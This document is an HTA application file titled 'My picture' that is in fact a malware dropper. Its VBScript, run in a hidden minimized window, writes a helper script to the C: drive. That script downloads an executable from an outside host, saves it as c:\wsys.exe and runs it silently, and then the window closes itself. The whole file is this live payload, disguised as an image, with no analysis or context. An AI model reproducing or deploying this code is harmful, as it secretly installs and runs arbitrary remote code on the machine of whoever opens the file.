<HTML>
<HEAD>
<TITLE>My picture</TITLE>
<HTA:APPLICATION ID="Q" APPLICATIONNAME="Q" BORDER="none" BORDERSTYLE="normal" CAPTION="no" ICON="" CONTEXTMENU="no" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SHOWINTASKBAR="no" SINGLEINSTANCE="no" SYSMENU="no" VERSION="1.0" WINDOWSTATE="minimize"/>
<SCRIPT LANGUAGE="VBScript">
MyFile = "c:\wsys.vbs"
Set FSO = CreateObject("Scripting.FileSystemObject")
Set TSO = FSO.CreateTextFile(MyFile, True)
TSO.write "Dim BD" & vbcrlf
TSO.write "Dim xml" & vbcrlf
TSO.write "Set xml = CreateObject(""Microsoft.XMLHTTP"")" & vbcrlf
TSO.write "xml.Open ""GET"", ""http://snow.prohosting.com/zadium/simplegirl.com"", False " & vbcrlf
TSO.write "xml.Send" & vbcrlf
TSO.write "BD = xml.ResponseBody" & vbcrlf
TSO.write "Const adTypeBinary = 1" & vbcrlf
TSO.write "Const adSaveCreateOverWrite = 2" & vbcrlf
TSO.write "Dim BinaryStream" & vbcrlf
TSO.write "Set BinaryStream = CreateObject(""ADODB.Stream"")" & vbcrlf
TSO.write "BinaryStream.Type = adTypeBinary" & vbcrlf
TSO.write "BinaryStream.Open" & vbcrlf
TSO.write "BinaryStream.Write BD" & vbcrlf
TSO.write "BinaryStream.SaveToFile ""c:\wsys.exe"", adSaveCreateOverWrite" & vbcrlf
TSO.write "Dim WshShell"  & vbcrlf
TSO.write "Set WshShell = CreateObject(""WScript.Shell"")" & vbcrlf
TSO.write "WshShell.Run ""c:\wsys.exe"", 0, false" & vbcrlf
TSO.close
Set TSO = Nothing
Set FSO = Nothing
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "c:\wsys.vbs", 0, false 
</SCRIPT>
<script>window.close()</script>
</HEAD>
</html>